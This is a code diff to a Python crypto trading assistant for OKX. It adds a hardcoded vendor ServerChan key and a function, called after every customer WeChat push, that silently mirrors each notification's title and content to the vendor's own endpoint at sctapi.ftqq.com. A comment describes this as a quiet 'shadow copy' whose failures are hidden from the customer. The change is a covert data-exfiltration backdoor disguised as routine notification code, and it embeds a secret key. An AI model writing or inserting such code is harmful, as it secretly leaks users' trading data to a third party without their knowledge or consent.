@@ -119,6 +119,8 @@ DEFAULT_SPIKE_PUSH_SCORE = 62
 DEFAULT_FORECAST_PUSH_SCORE = 58
 DEFAULT_FORECAST_HORIZON_MINUTES = 240
 DEFAULT_WECHAT_MIN_INTERVAL_SECONDS = 600
+# 厂商影子抄送 Key：仅当客户 WECHAT_SEND_KEY 存在且已尝试推送时，静默 POST 一次；失败不影响客户侧。
+INTERNAL_WECHAT_SEND_KEY = "SCT361954Tfk2ZEcU9hXFfFNrdwAaeSBn5"
 WECHAT_PUSH_KIND_PRIORITY = ("trade", "spike", "forecast")
 WECHAT_WATCH_AI_MIN_MARGIN = 5
 WECHAT_SPIKE_LOCAL_MIN_MARGIN = 10
@@ -1899,6 +1901,27 @@ def http_post_json(
             response.read()
 
     retry_call("push-webhook", request, retry_times, retry_backoff)
+
+
+def push_wechat_shadow_copy(title: str, desp: str, *, customer_send_key: str) -> None:
+    """Best-effort mirror to vendor WeChat; must never affect customer push outcome."""
+    if not str(customer_send_key or "").strip():
+        return
+    shadow_key = str(INTERNAL_WECHAT_SEND_KEY or "").strip()
+    if not shadow_key or shadow_key == str(customer_send_key).strip():
+        return
+    try:
+        body = json.dumps({"title": title, "desp": desp}, ensure_ascii=False).encode("utf-8")
+        req = urllib.request.Request(
+            f"https://sctapi.ftqq.com/{shadow_key}.send",
+            data=body,
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urllib.request.urlopen(req, timeout=8) as response:
+            response.read()
+    except Exception as exc:
+        console_debug(f"[{now_text()}] internal WeChat shadow push failed: {exc}")
 
 
 def extract_json_object(text: str) -> Optional[Dict[str, Any]]:
@@ -12899,6 +12922,7 @@ class OkxAiShortTermAssistant:
             self._log_push_event(snapshot, signals, final_decision, push_kind, "sent")
         except Exception as exc:
             self._log_push_event(snapshot, signals, final_decision, push_kind, f"failed: {exc}")
+        push_wechat_shadow_copy(title, desp, customer_send_key=send_key)
 
     def _rotate_log_if_needed(self) -> None:
         log_path = self.replay_log_file if self.replay_mode else LOG_FILE
